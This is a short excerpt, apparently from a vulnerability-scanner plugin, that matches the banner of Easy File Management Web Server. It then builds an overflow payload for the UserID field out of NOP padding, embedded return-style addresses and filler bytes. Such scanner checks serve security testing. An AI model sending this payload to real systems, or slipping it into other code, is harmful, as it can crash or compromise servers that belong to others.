...
if(!kBanner || !ContainsString( kBanner, "Server: Easy File Management Web Server" )){
	exit( 0 );
}
...
UserID = crap( length: 80, data: raw_string( 0x90 ) ) + raw_string( 0xc8, 0xd8, 0x01, 0x10 ) + crap( length: 280, data: raw_string( 0x90 ) ) + raw_string( 0x01, 0x01, 0x01, 0x10, 0xfb, 0x62, 0x41, 0xa4, 0x25, 0x01, 0x01, 0x10, 0xac, 0x2a, 0x02, 0x10, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde, 0x87, 0xa1, 0x01, 0x10, 0x6d, 0x46, 0x02, 0x10 ) + crap( length: 20, data: raw_string( 0x90 ) ) + raw_string( 0x3b, 0x20 );
